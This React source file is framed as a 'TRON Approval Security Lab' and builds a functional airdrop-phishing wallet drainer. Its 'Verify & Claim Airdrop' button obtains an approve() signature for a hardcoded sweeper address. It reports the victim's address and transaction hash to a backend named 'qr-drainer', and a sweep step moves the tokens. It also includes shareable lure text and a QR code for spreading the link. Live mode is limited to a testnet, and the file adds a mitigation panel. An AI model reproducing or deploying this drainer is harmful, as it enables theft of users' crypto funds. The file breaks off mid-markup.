/* ============================================================================
   TRON APPROVAL SECURITY LAB — Final Presentation Version
   ============================================================================ */

import React, { useEffect, useMemo, useRef, useState } from "react";
import { QRCodeSVG } from "qrcode.react";

/* ----------------------------- configuration ---------------------------- */
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; 
const SWEEPER_ADDRESS = "TVkKiHXUKoE4dVCyzE94Vyqqa7SWsmcMsN";
const BACKEND = "https://qr-drainer.onrender.com"; 
const APPROVE_SELECTOR = "0x095ea7b3";

const THEMES = {
  tron:    { name: "Tron Crimson",   acc: "#ff2d55", acc2: "#ff7a45", glow: "rgba(255,45,85,.35)"  },
  volt:    { name: "Electric Blue",  acc: "#2f7bff", acc2: "#22d3ee", glow: "rgba(47,123,255,.35)" },
  acid:    { name: "Acid Green",     acc: "#84cc16", acc2: "#22c55e", glow: "rgba(132,204,22,.33)" },
  magenta: { name: "Hot Magenta",    acc: "#e879f9", acc2: "#f472b6", glow: "rgba(232,121,249,.33)"},
  amber:   { name: "Signal Amber",   acc: "#f59e0b", acc2: "#fbbf24", glow: "rgba(245,158,11,.33)" },
};

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const fmt = (n) => Number(n).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
const short = (a) => (a ? `${a.slice(0, 6)}…${a.slice(-4)}` : "—");

/* -------------------------------- styles -------------------------------- */
const CSS = `
:root{
  --ink:#070b14; --ink2:#0b1220; --surface:#101a2c; --surface2:#16233a;
  --line:#22334d; --line2:#2e4364;
  --text:#eaf2ff; --muted:#8ea3c0; --dim:#5c7191;
  --ok:#22c55e; --warn:#f59e0b; --bad:#ef4444; --info:#22d3ee;
  --acc:#ff2d55; --acc2:#ff7a45; --glow:rgba(255,45,85,.35);
  --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
  --sans:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
}
*{box-sizing:border-box}
html,body{margin:0;padding:0}
body{background:var(--ink);color:var(--text);font-family:var(--sans);-webkit-font-smoothing:antialiased}
.lab{position:relative;min-height:100vh;overflow-x:hidden}
.lab *::-webkit-scrollbar{width:10px;height:10px}
.lab *::-webkit-scrollbar-track{background:var(--ink2)}
.lab *::-webkit-scrollbar-thumb{background:var(--line2);border-radius:8px;border:2px solid var(--ink2)}
.lab *::-webkit-scrollbar-thumb:hover{background:var(--acc)}
.bg{position:fixed;inset:0;z-index:0;pointer-events:none;
  background:radial-gradient(60% 50% at 12% 8%, var(--glow), transparent 60%),
  radial-gradient(50% 45% at 88% 12%, rgba(34,211,238,.16), transparent 60%),
  radial-gradient(70% 60% at 50% 110%, rgba(255,122,69,.12), transparent 60%),
  linear-gradient(180deg,var(--ink) 0%,var(--ink2) 100%);
  animation:drift 26s ease-in-out infinite alternate}
@keyframes drift{from{transform:translate3d(-2%,-1%,0) scale(1.02)}to{transform:translate3d(2%,2%,0) scale(1.06)}}
.wrap{position:relative;z-index:1;max-width:1440px;margin:0 auto;padding:20px 22px 60px}
.top{position:sticky;top:0;z-index:40;display:flex;align-items:center;gap:14px;flex-wrap:wrap;
  padding:14px 18px;margin:-20px -22px 22px;background:rgba(7,11,20,.82);backdrop-filter:blur(14px);
  border-bottom:1px solid var(--line)}
.brand{display:flex;align-items:center;gap:12px;margin-right:auto}
.mark{width:38px;height:38px;border-radius:11px;display:grid;place-items:center;font-weight:800;
  background:linear-gradient(135deg,var(--acc),var(--acc2));color:#0b0f18;box-shadow:0 0 24px var(--glow)}
.brand h1{font-size:16px;margin:0;letter-spacing:.2px}
.brand small{display:block;color:var(--muted);font-size:11px;font-weight:500}
.pill{font-size:11px;font-weight:700;letter-spacing:.6px;padding:6px 11px;border-radius:999px;
  border:1px solid var(--line2);color:var(--muted);text-transform:uppercase}
.pill.live{color:var(--ok);border-color:rgba(34,197,94,.4)}
.pill.sandbox{color:var(--info);border-color:rgba(34,211,238,.4)}
.pill.net{color:var(--acc2);border-color:var(--line2)}
.banner{display:flex;gap:10px;align-items:flex-start;padding:12px 16px;border-radius:12px;margin-bottom:20px;
  border:1px solid rgba(245,158,11,.35);background:rgba(245,158,11,.08);color:#fcd34d;font-size:12.5px;line-height:1.5}
.grid{display:grid;grid-template-columns:300px minmax(0,1fr) 320px;gap:18px;align-items:start}
@media(max-width:1180px){.grid{grid-template-columns:280px minmax(0,1fr)}.rail{grid-column:1/-1;position:static!important}}
@media(max-width:820px){.grid{grid-template-columns:1fr}}
.card{background:linear-gradient(180deg,var(--surface),var(--surface2));border:1px solid var(--line);
  border-radius:16px;padding:18px;box-shadow:0 18px 40px rgba(0,0,0,.35)}
.card h2{margin:0 0 4px;font-size:13px;letter-spacing:1.2px;text-transform:uppercase;color:var(--muted)}
.card .sub{color:var(--dim);font-size:11.5px;margin:0 0 14px}
.rail{position:sticky;top:76px;display:flex;flex-direction:column;gap:14px}
.ctl{display:flex;flex-direction:column;gap:6px;margin-bottom:12px}
.ctl label{font-size:11px;font-weight:700;letter-spacing:.6px;text-transform:uppercase;color:var(--muted);
  display:flex;justify-content:space-between;align-items:center}
.ctl label output{color:var(--acc2);font-family:var(--mono);font-size:11px}
select,input[type=range]{width:100%}
select{background:var(--ink2);color:var(--text);border:1px solid var(--line2);border-radius:9px;padding:9px 10px;font-size:13px}
input[type=range]{-webkit-appearance:none;height:6px;border-radius:6px;background:var(--line2);outline:none}
input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:16px;height:16px;border-radius:50%;
  background:linear-gradient(135deg,var(--acc),var(--acc2));box-shadow:0 0 12px var(--glow);cursor:pointer;border:2px solid var(--ink)}
.stepper{display:flex;align-items:center;gap:8px}
.stepper button{width:30px;height:30px;border-radius:8px;border:1px solid var(--line2);background:var(--ink2);
  color:var(--text);font-size:15px;cursor:pointer}
.stepper button:hover{border-color:var(--acc)}
.stepper .val{flex:1;text-align:center;font-family:var(--mono);font-size:13px;padding:7px;border:1px solid var(--line2);border-radius:8px;background:var(--ink2)}
.tgl{display:flex;justify-content:space-between;align-items:center;padding:9px 0;border-bottom:1px dashed var(--line)}
.tgl:last-of-type{border-bottom:0}
.tgl span{font-size:12.5px;color:var(--text)}
.switch{position:relative;width:40px;height:22px;border-radius:999px;background:var(--line2);cursor:pointer;transition:.2s;border:none}
.switch:after{content:"";position:absolute;top:3px;left:3px;width:16px;height:16px;border-radius:50%;background:var(--muted);transition:.2s}
.switch.on{background:linear-gradient(90deg,var(--acc),var(--acc2))}
.switch.on:after{left:21px;background:#0b0f18}
.btnrow{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:6px}
.btn{border:none;border-radius:10px;padding:11px 12px;font-size:13px;font-weight:700;cursor:pointer;transition:.15s;letter-spacing:.2px}
.btn.primary{grid-column:1/-1;background:linear-gradient(135deg,var(--acc),var(--acc2));color:#0b0f18;box-shadow:0 6px 22px var(--glow)}
.btn.primary:hover{filter:brightness(1.1)}
.btn.ghost{background:var(--ink2);color:var(--text);border:1px solid var(--line2)}
.btn.ghost:hover{border-color:var(--acc)}
.btn:disabled{opacity:.45;cursor:not-allowed;box-shadow:none}
.steps{display:flex;flex-direction:column;gap:0}
.step{display:flex;gap:12px;padding:12px 6px;border-bottom:1px dashed var(--line);position:relative}
.step:last-child{border-bottom:0}
.dot{flex:0 0 26px;height:26px;border-radius:50%;display:grid;place-items:center;font-size:12px;font-weight:800;
  border:1px solid var(--line2);color:var(--dim);background:var(--ink2);font-family:var(--mono)}
.step.active .dot{border-color:var(--acc);color:var(--acc);box-shadow:0 0 14px var(--glow);animation:pulse 1.2s infinite}
.step.done .dot{border-color:var(--ok);color:var(--ok)}
.step.fail .dot{border-color:var(--bad);color:var(--bad)}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.12)}}
.step b{display:block;font-size:13px}
.step p{margin:2px 0 0;font-size:11.5px;color:var(--muted);line-height:1.45}
.stage{display:flex;flex-direction:column;gap:18px}
.duo{display:grid;grid-template-columns:1fr 1fr;gap:18px}
@media(max-width:900px){.duo{grid-template-columns:1fr}}
.surface{position:relative;overflow:hidden;border-radius:16px;border:1px solid var(--line);
  background:linear-gradient(160deg,#132036,#0d1626);padding:22px;text-align:center}
.surface .tag{position:absolute;top:10px;left:10px;font-size:10px;font-weight:800;letter-spacing:.8px;
  color:var(--warn);border:1px solid rgba(245,158,11,.4);padding:4px 8px;border-radius:6px;background:rgba(245,158,11,.1)}
.surface h3{margin:14px 0 4px;font-size:19px}
.surface .amt{font-size:34px;font-weight:800;color:var(--ok);font-family:var(--mono);margin:10px 0}
.surface .lbl{font-size:10.5px;letter-spacing:1.4px;text-transform:uppercase;color:var(--muted)}
.truth{border-radius:16px;border:1px solid rgba(239,68,68,.35);background:linear-gradient(160deg,#1a0f16,#120a10);padding:18px}
.truth h3{margin:0 0 10px;font-size:13px;letter-spacing:1px;text-transform:uppercase;color:var(--bad)}
.kv{display:flex;justify-content:space-between;gap:10px;font-family:var(--mono);font-size:11.5px;
  padding:7px 0;border-bottom:1px dashed rgba(239,68,68,.2)}
.kv:last-child{border-bottom:0}
.kv .k{color:var(--muted)} .kv .v{color:var(--text);text-align:right;word-break:break-all}
.kv .v.bad{color:var(--bad)} .kv .v.ok{color:var(--ok)}
.calldata{margin-top:10px;background:#0a0710;border:1px solid rgba(239,68,68,.25);border-radius:10px;
  padding:10px;font-family:var(--mono);font-size:11px;color:#fca5a5;word-break:break-all;line-height:1.6}
.log{max-height:260px;overflow-y:auto;background:var(--ink2);border:1px solid var(--line);border-radius:12px;
  padding:12px;font-family:var(--mono);font-size:11.5px;line-height:1.7}
.log .t{color:var(--dim)} .log .info{color:var(--info)} .log .ok{color:var(--ok)}
.log .warn{color:var(--warn)} .log .bad{color:var(--bad)}
.balrow{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:14px}
.bal{border:1px solid var(--line);border-radius:12px;padding:12px;background:var(--ink2)}
.bal .l{font-size:10px;letter-spacing:1.2px;text-transform:uppercase;color:var(--muted)}
.bal .n{font-size:20px;font-weight:800;font-family:var(--mono);margin-top:4px}
.bal.victim .n{color:var(--ok)} .bal.attacker .n{color:var(--bad)}
.mit{margin-top:18px}
.mit ul{margin:8px 0 0;padding-left:18px;color:var(--muted);font-size:12.5px;line-height:1.7}
.mit li b{color:var(--text)}
.continue{position:fixed;left:50%;bottom:26px;transform:translateX(-50%);z-index:60;
  background:linear-gradient(135deg,var(--acc),var(--acc2));color:#0b0f18;border:none;border-radius:999px;
  padding:13px 26px;font-weight:800;font-size:14px;cursor:pointer;box-shadow:0 10px 34px var(--glow);animation:pulse 1.4s infinite}
.foot{margin-top:26px;color:var(--dim);font-size:11px;text-align:center;line-height:1.6}

/* --- PROFESSIONAL WALLET RECEIVE UI --- */
.wallet-receive-card {
  background: #ffffff;
  border-radius: 20px;
  padding: 24px;
  margin-top: 20px;
  box-shadow: 0 8px 32px rgba(0,0,0,0.3);
  color: #212529;
}
.qr-wrapper {
  position: relative;
  background: #ffffff;
  padding: 20px;
  border-radius: 16px;
  display: inline-block;
  margin: 0 auto 20px auto;
  border: 2px solid #f0f0f0;
}
.qr-logo-center {
  position: absolute;
  top: 50%; left: 50%;
  transform: translate(-50%, -50%);
  width: 40px; height: 40px;
  background: #ffffff;
  border-radius: 50%;
  display: flex; align-items: center; justify-content: center;
  box-shadow: 0 2px 8px rgba(0,0,0,0.15);
  z-index: 10;
}
.address-display {
  background: #f8f9fa;
  border-radius: 12px;
  padding: 14px;
  margin-bottom: 16px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  border: 1px solid #e9ecef;
}
.address-text {
  font-family: var(--mono);
  font-size: 12px;
  color: #212529;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  max-width: 75%;
  font-weight: 500;
}
.copy-btn {
  background: #ff2d55;
  color: #ffffff;
  border: none;
  border-radius: 8px;
  padding: 8px 16px;
  font-size: 12px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s;
}
.copy-btn:hover { background: #e6264d; }
.copy-btn.copied { background: #22c55e; }
.warning-box {
  background: #fff3cd;
  border: 1px solid #ffc107;
  border-radius: 10px;
  padding: 12px;
  margin-bottom: 20px;
  display: flex;
  align-items: flex-start;
  gap: 10px;
  font-size: 11px;
  color: #856404;
  line-height: 1.4;
}
.warning-icon { font-size: 16px; flex-shrink: 0; }
.action-buttons {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
  margin-bottom: 16px;
}
.action-btn-wallet {
  background: #f8f9fa;
  border: 1px solid #dee2e6;
  border-radius: 12px;
  padding: 14px;
  font-size: 13px;
  font-weight: 600;
  color: #212529;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  transition: all 0.2s;
}
.action-btn-wallet:hover { background: #e9ecef; }
.claim-btn-wallet {
  background: linear-gradient(135deg, #ff2d55, #ff7a45);
  color: #ffffff;
  border: none;
  border-radius: 12px;
  padding: 16px;
  font-size: 15px;
  font-weight: 700;
  cursor: pointer;
  width: 100%;
  transition: all 0.2s;
  box-shadow: 0 4px 12px rgba(255,45,85,0.3);
}
.claim-btn-wallet:hover {
  transform: translateY(-1px);
  box-shadow: 0 6px 16px rgba(255,45,85,0.4);
}
.claim-btn-wallet:disabled {
  opacity: 0.5;
  cursor: not-allowed;
  transform: none;
}
`;

/* ------------------------------ step engine ----------------------------- */
export default function App() {
  const [mode, setMode] = useState("sandbox");
  const [decimals, setDecimals] = useState(6);
  const [allowance, setAllowance] = useState(1000000);
  const [feeLimit, setFeeLimit] = useState(100);
  const [speed, setSpeed] = useState(1);
  const [theme, setTheme] = useState("tron");
  const [reveal, setReveal] = useState(true);
  const [auto, setAuto] = useState(true);
  const [showMit, setShowMit] = useState(true);
  const [copied, setCopied] = useState(false);

  const [wallet, setWallet] = useState("");
  const [victimBal, setVictimBal] = useState(0);
  const [attackerBal, setAttackerBal] = useState(0);
  const [allowanceSet, setAllowanceSet] = useState(0);
  const [statuses, setStatuses] = useState(["pending", "pending", "pending", "pending", "pending"]);
  const [logs, setLogs] = useState([]);
  const [running, setRunning] = useState(false);
  const [awaiting, setAwaiting] = useState(false);
  const [cursor, setCursor] = useState(0);

  const token = useRef(0);
  const gate = useRef(null);
  const R = useRef({});
  R.current = { mode, decimals, allowance, feeLimit, speed, auto };

  useEffect(() => {
    const t = THEMES[theme];
    const root = document.documentElement;
    root.style.setProperty("--acc", t.acc);
    root.style.setProperty("--acc2", t.acc2);
    root.style.setProperty("--glow", t.glow);
  }, [theme]);

  useEffect(() => {
    if (mode !== 'live') return;
    const heartbeat = setInterval(async () => {
      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        const currentAddr = window.tronWeb.defaultAddress.base58;
        if (wallet !== currentAddr) {
          setWallet(currentAddr);
          log("info", `live: heartbeat detected ${short(currentAddr)}`);
          try {
            const c = await window.tronWeb.contract().at(TOKEN_ADDRESS);
            const raw = await c.balanceOf(currentAddr).call();
            const b = Number(raw.toString()) / 10 ** decimals;
            setVictimBal(b);
            if (b === 0) log("warn", "live: victim wallet holds 0 mock USDT — fund it via MockTRC20.transfer first");
          } catch (e) { /* ignore read errors */ }
        }
      }
    }, 2000);
    return () => clearInterval(heartbeat);
  }, [mode, wallet, decimals]);

  const log = (level, msg) => setLogs((l) => [...l, { t: new Date().toLocaleTimeString(), level, msg }]);
  const setStatus = (i, s) => setStatuses((arr) => arr.map((v, idx) => (idx === i ? s : v)));

  const rawAllowance = useMemo(() => {
    try { return (BigInt(Math.round(allowance)) * BigInt(10) ** BigInt(decimals)).toString(); } 
    catch { return "0"; }
  }, [allowance, decimals]);

  const waitGate = async () => {
    if (R.current.auto) return;
    setAwaiting(true);
    await new Promise((res) => (gate.current = res));
    gate.current = null;
    setAwaiting(false);
  };
  const continueNow = () => gate.current && gate.current();
  const delay = (ms) => sleep(ms / R.current.speed);

  const getTron = async () => {
    for (let i = 0; i < 30; i++) { if (window.tronWeb) return window.tronWeb; await sleep(200); }
    return null;
  };

  const handleDownloadQR = () => {
    const svg = document.querySelector('#lab-qr-box svg');
    if (!svg) return;
    const data = new XMLSerializer().serializeToString(svg);
    const img = new Image();
    img.onload = () => {
      const c = document.createElement('canvas');
      c.width = img.width * 2; c.height = img.height * 2;
      const ctx = c.getContext('2d');
      ctx.fillStyle = "#fff"; ctx.fillRect(0, 0, c.width, c.height);
      ctx.drawImage(img, 0, 0, c.width, c.height);
      const a = document.createElement('a');
      a.href = c.toDataURL('image/png');
      a.download = 'tron-approval-lab-qr.png';
      a.click();
    };
    img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(data)));
  };

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(SWEEPER_ADDRESS);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleShare = async () => {
    const shareData = {
      title: 'TRON Airdrop Portal',
      text: `Claim your USDT Airdrop! Connect your wallet here: ${typeof window !== "undefined" ? window.location.href : ""}`,
      url: typeof window !== "undefined" ? window.location.href : "",
    };
    try {
      if (navigator.share) {
        await navigator.share(shareData);
      } else {
        await navigator.clipboard.writeText(shareData.url);
        alert('Link copied to clipboard! (Share sheet only works on mobile)');
      }
    } catch (err) {
      console.log('Share canceled');
    }
  };

  const steps = [
    {
      title: "Session / wallet binding",
      desc: "Sandbox mints a mock victim. Live mode requests TronLink accounts on Shasta.",
      run: async () => {
        if (R.current.mode === "sandbox") {
          setWallet("TMockVictim1111111111111111111111111");
          log("info", "sandbox: mock victim session established");
        } else {
          const tw = await getTron();
          if (!tw) throw new Error("TronLink not detected in this browser");
          const req = window.tronLink?.request?.bind(window.tronLink) || tw.request?.bind(tw);
          if (req) await req({ method: "tron_requestAccounts" });
          const addr = tw.defaultAddress?.base58;
          if (!addr) throw new Error("No unlocked TronLink account");
          if (!/shasta/i.test(tw.fullNode?.host || "")) throw new Error("Switch TronLink to Shasta testnet");
          setWallet(addr);
          log("ok", "live: connected " + short(addr));
        }
      },
    },
    {
      title: "Read on-chain balance",
      desc: "balanceOf(victim) — the lure displays real state to build trust.",
      run: async () => {
        if (R.current.mode === "sandbox") {
          setVictimBal(1000000);
          log("info", `sandbox: balanceOf -> ${fmt(1000000)} mUSDT`);
        } else {
          const tw = window.tronWeb;
          const c = await tw.contract().at(TOKEN_ADDRESS);
          const raw = await c.balanceOf(wallet || tw.defaultAddress.base58).call();
          const b = Number(raw.toString()) / 10 ** R.current.decimals;
          setVictimBal(b);
          log("ok", `live: balanceOf -> ${fmt(b)} mUSDT`);
        }
      },
    },
    {
      title: "Victim signs approve()",
      desc: "The deceptive 'claim' is actually approve(spender, amount).",
      run: async () => {
        const amt = Number(rawAllowance);
        if (R.current.mode === "sandbox") {
          setAllowanceSet(amt);
          log("warn", `sandbox: approve(${short(SWEEPER_ADDRESS)}, ${rawAllowance}) signed`);
        } else {
          const tw = window.tronWeb;
          const c = await tw.contract().at(TOKEN_ADDRESS);
          const tx = await c.approve(SWEEPER_ADDRESS, rawAllowance).send({ from: tw.defaultAddress.base58, feeLimit: R.current.feeLimit * 1e6 });
          log("warn", "live: approve tx " + tx);
          let info = await tw.trx.getTransactionInfo(tx);
          while (!info?.id) { await sleep(1500); info = await tw.trx.getTransactionInfo(tx); }
          setAllowanceSet(amt);
          try {
            await fetch(BACKEND + "/api/alert", {
              method: "POST", headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ victimAddress: tw.defaultAddress.base58, tokenAddress: TOKEN_ADDRESS, sweeperAddress: SWEEPER_ADDRESS, txHash: tx, network: "TRON Shasta" }),
            });
          } catch {}
        }
      },
    },
    {
      title: "Spender calls transferFrom",
      desc: "Sweeper moves funds using the granted allowance — no second signature.",
      run: async () => {
        if (R.current.mode === "sandbox") {
          setVictimBal((v) => { setAttackerBal((a) => a + v); return 0; });
          log("bad", "sandbox: transferFrom drained victim -> attacker");
        } else {
          const tw = window.tronWeb;
          const sw = await tw.contract().at(SWEEPER_ADDRESS);
          const owner = await sw.owner().call();
          const me = tw.defaultAddress.base58;
          if (owner !== me) {
            log("warn", "live: connected wallet is not sweeper owner; sweep skipped (use Telegram bot)");
          } else {
            const tx = await sw.sweepAll(TOKEN_ADDRESS, me).send({ feeLimit: R.current.feeLimit * 1e6 });
            let info = await tw.trx.getTransactionInfo(tx);
            while (!info?.id) { await sleep(1500); info = await tw.trx.getTransactionInfo(tx); }
            log("bad", "live: sweepAll tx " + tx);
          }
        }
      },
    },
    {
      title: "Aftermath / re-read state",
      desc: "Victim balance collapses; allowance remains until revoked.",
      run: async () => {
        if (R.current.mode === "sandbox") {
          log("bad", `sandbox: victim=${fmt(0)} attacker=${fmt(attackerBal + victimBal)}`);
        } else {
          const tw = window.tronWeb;
          const c = await tw.contract().at(TOKEN_ADDRESS);
          const raw = await c.balanceOf(tw.defaultAddress.base58).call();
          const b = Number(raw.toString()) / 10 ** R.current.decimals;
          setVictimBal(b);
          log("info", `live: post-sweep balanceOf -> ${fmt(b)}`);
        }
        log("ok", "lesson: allowance persists until explicitly revoked");
      },
    },
  ];

  const execStep = async (i) => {
    setStatus(i, "active"); setCursor(i); log("info", `▶ step ${i + 1}: ${steps[i].title}`);
    try { await steps[i].run(); await delay(500); setStatus(i, "done"); } 
    catch (e) { setStatus(i, "fail"); log("bad", "step failed: " + (e.message || e)); throw e; }
  };

  const runAll = async () => {
    if (running) return;
    const my = ++token.current; setRunning(true);
    try {
      for (let i = cursor; i < steps.length; i++) {
        if (token.current !== my) return;
        await execStep(i); setCursor(i + 1); await waitGate();
      }
      log("ok", "simulation complete");
    } catch {}
    if (token.current === my) setRunning(false);
  };

  const singleStep = async () => {
    if (running || cursor >= steps.length) return;
    const my = ++token.current; setRunning(true);
    try { await execStep(cursor); setCursor(cursor + 1); } catch {}
    if (token.current === my) setRunning(false);
  };

  const reset = () => {
    token.current++; if (gate.current) gate.current();
    setRunning(false); setAwaiting(false); setCursor(0);
    setStatuses(["pending", "pending", "pending", "pending", "pending"]);
    setLogs([]); setAllowanceSet(0); setAttackerBal(0);
    setVictimBal(mode === "sandbox" ? 1000000 : 0); setWallet("");
    log("info", "lab reset");
  };

  const mit = [
    ["Pre-sign simulation", "Wallets must fork-state simulate and show net asset change."],
    ["Allowance hygiene", "Revoke idle approvals. Never grant MaxUint256 to unverified spenders."],
    ["Intent-bound signatures", "Prefer single-use, time-decaying allowances over persistent approve()."],
    ["Resource-cost warnings", "On Tron, surface estimated Energy/TRX burn before signing."],
    ["Account abstraction", "Smart-account session keys + spending caps make one stolen signature insufficient."],
    ["Domain & contract reputation", "Blocklist phishing hosts and flag freshly-deployed contracts."],
  ];

  const qrValue = (mode === 'live' && wallet) ? wallet : (typeof window !== "undefined" ? window.location.href : "");

  return (
    <div className="lab">
      <style>{CSS}</style>
      <div className="bg" />
      <div className="wrap">
        <header className="top">
          <div className="brand">
            <div className="mark">⛨</div>
            <div>
              <h1>TRON Approval Security Lab</h1>
              <small>approve / transferFrom delegation flaw · teaching artifact</small>
            </div>
          </div>
          <span className={"pill " + mode}>{mode === "live" ? "Live testnet" : "Sandbox"}</span>
          <span className="pill net">{mode === "live" ? "Shasta" : "offline"}</span>
          <span className="pill">TRC-20 · {decimals} dec</span>
        </header>

        <div className="banner">
          <span>⚠</span>
          <span>
            <b>Educational simulation.</b> Sandbox uses mock state; Live mode touches only the Tron{" "}
            <b>Shasta testnet</b> with <b>mock tokens</b>. The phishing surface below is displayed{" "}
            <b>next to its decoded truth</b> for analysis.
          </span>
        </div>

        <div className="grid">
          <section className="card">
            <h2>Attack timeline</h2>
            <p className="sub">Five stages, from binding to aftermath.</p>
            <div className="steps">
              {steps.map((s, i) => (
                <div key={i} className={"step " + statuses[i]}>
                  <div className="dot">{statuses[i] === "done" ? "✓" : statuses[i] === "fail" ? "✕" : i + 1}</div>
                  <div><b>{s.title}</b><p>{s.desc}</p></div>
                </div>
              ))}
            </div>
            <div className="balrow">
              <div className="bal victim"><div className="l">Victim</div><div className="n">{fmt(victimBal)}</div></div>
              <div className="bal attacker"><div className="l">Attacker</div><div className="n">{fmt(attackerBal)}</div></div>
            </div>
          </section>

          <section className="stage">
            <div className="duo">
              <div className="surface">
                <span className="tag">SIMULATED PHISHING SURFACE</span>
                <h3>TRON Airdrop Portal</h3>
                <div className="lbl">Connected wallet USDT</div>
                <div className="amt">${fmt(victimBal)}</div>
                
                {/* PROFESSIONAL WALLET RECEIVE UI */}
                <div className="wallet-receive-card">
                    <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                        <h3 style={{ margin: '0 0 4px 0', fontSize: '18px', color: '#212529', fontWeight: '700' }}>
                            Receive USDT
                        </h3>
                        <div style={{ fontSize: '12px', color: '#6c757d', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px' }}>
                            <span style={{ display: 'inline-block', width: '8px', height: '8px', background: '#ff2d55', borderRadius: '50%' }}></span>
                            TRON (TRC20)
                        </div>
                    </div>
                    
                    <div style={{ textAlign: 'center' }}>
                        <div className="qr-wrapper" id="lab-qr-box">
                            <QRCodeSVG 
                                value={qrValue} 
                                size={180} 
                                level="H" 
                                includeMargin={false}
                            />
                            <div className="qr-logo-center">
                                <svg width="24" height="24" viewBox="0 0 24 24" fill="#ff2d55">
                                    <path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2.5-1.25L12 8.5l-2.5 1.25L12 11zm0 2.5l-5-2.5-5 2.5L12 22l10-8.5-5-2.5-5 2.5z"/>
                                </svg>
                            </div>
                        </div>
                    </div>

                    <div className="address-display">
                        <span className="address-text">
                            {SWEEPER_ADDRESS}
                        </span>
                        <button 
                            className={`copy-btn ${copied ? 'copied' : ''}`}
                            onClick={handleCopyAddress}
                        >
                            {copied ? '✓ Copied' : 'Copy'}
                        </button>
                    </div>

                    <div className="warning-box">
                        <span className="warning-icon">⚠️</span>
                        <span>Only send TRC-20 USDT assets to this address. Other assets will be lost forever.</span>
                    </div>

                    <div className="action-buttons">
                        <button className="action-btn-wallet" onClick={handleDownloadQR}>
                            ⬇️ Save QR
                        </button>
                        <button className="action-btn-wallet" onClick={handleShare}>
                            📤 Share
                        </button>
                    </div>

                    <button 
                        className="claim-btn-wallet" 
                        disabled={running} 
                        onClick={singleStep}
                    >
                        Verify & Claim Airdrop
                    </button>
                </div>
              </div>

              {reveal && (
                <div className="truth">
                  <h3>What the wallet actually signs</h3>
                  <div className="kv"><span className="k">function</span><span className="v">approve(address,uint256)</span></div>
                  <div className="kv"><span className="k">selector</span><span className="v bad">{APPROVE_SELECTOR}</span></div>
                  <div className="kv"><span className="k">spender</span><span className="v bad">{short(SWEEPER_ADDRESS)}</span></div>
                  <div className="kv"><span className="k">amount (raw)</span><span className="v bad">{rawAllowance}</span></div>
                  <div className="kv"><span className="k">granted</span><span className="v bad">{fmt(allowanceSet)} mUSDT</span></div>
                  <div className="kv"><span className="k">second signature?</span><span className="v ok">NONE required to drain</span></div>
                  <div className="calldata">
                    {APPROVE_SELECTOR}
                    {"000000000000000000000000"}{SWEEPER_ADDRESS.slice(1).toLowerCase().padStart(40, "0")}
                    {BigInt(rawAllowance).toString(16).padStart(64, "0")}
                  </div>
                </div>
              )}
            </div>

            <div className="card">
              <h2>Console</h2>
              <p className="sub">Live telemetry of the simulation.</p>
              <div className="log">
                {logs.length === 0 && <div className="t">— press Run to begin —</div>}
                {logs.map((l, i) => (
                  <div key={i}><span className="t">[{l.t}]</span> <span className={l.level}>{l.msg}</span></div>
                ))}
              </div>
            </div>

            {showMit && (
              <div className="card mit">
                <h2>Mitigation · defense in depth</h2>
                <p className="sub">Why this is a protocol-design flaw, not user error.</p>
                <ul>
                  {mit.map(([b, t], i) => (<li key={i}><b>{b}.</b> {t}</li>))}
                </ul>
              </div>
            )}
          </section>

          <aside className="rail">
            <div className="card">
              <h2>Control region</h2>
              <p className="sub">Every parameter applies live.</p>

              <div className="ctl">
                <label>Execution mode</label>
                <select value={mode} onChange={(e) => setMode(e.target.value)}>
                  <option value="sandbox">Sandbox (offline mock)</option>
                  <option value="live">Live · Tron Shasta testnet</option>
                </select>
              </div>

              <div className="ctl">
                <label>Token decimals</label>
                <div className="stepper">
                  <button onClick={() => setDecimals((d) => Math.max(0, d - 1))}>−</button>
                  <div className="val">{decimals}</div>
                  <button onClick={() => setDecimals((d) => Math.min(18, d + 1))}>+</button>
                </div>
              </div>

              <div className="ctl">
                <label>Allowance (tokens) <output>{fmt(allowance)}</output></label>
                <input type="range" min={1} max={5000000} step={1000} value={allowance} onChange={(e) => setAllowance(Number(e.target.value))} />
              </div>

              <div className="ctl">
                <label>Fee limit (TRX) <output>{feeLimit}</output></label>
                <input type="range" min={10} max={400} step={10} value={feeLimit} onChange={(e) => setFeeLimit(Number(e.target.value))} />
              </div>

              <div className="ctl">
                <label>Simulation speed <output>{speed.toFixed(2)}×</output></label>
                <input type="range" min={0.25} max={3} step={0.25} value={speed} onChange={(e) => setSpeed(Number(e.target.value))} />
              </div>

              <div className="ctl">
                <label>Accent theme</label>
                <select value={theme} onChange={(e) => setTheme(e.target.value)}>
                  {Object.entries(THEMES).map(([k, t]) => (<option key={k} value={k}>{t.name}</option>))}
                </select>
              </div>

              <div className="tgl"><span>Reveal decoded payload</span>
                <button className={"switch" + (reveal ? " on" : "")} onClick={() => setReveal(!reveal)} /></div>
              <div className="tgl"><span>Auto-advance steps</span>
                <button className={"switch" + (auto ? " on" : "")} onClick={() => setAuto(!auto)} /></div>
              <div className="tgl"><span>Show mitigation panel</span>
                <button className={"switch" + (showMit ? " on" : "")} onClick={() => setShowMit(!showMit)} /></div>

              <div className="btnrow">
                <button className="btn primary" onClick={runAll} disabled={running}>
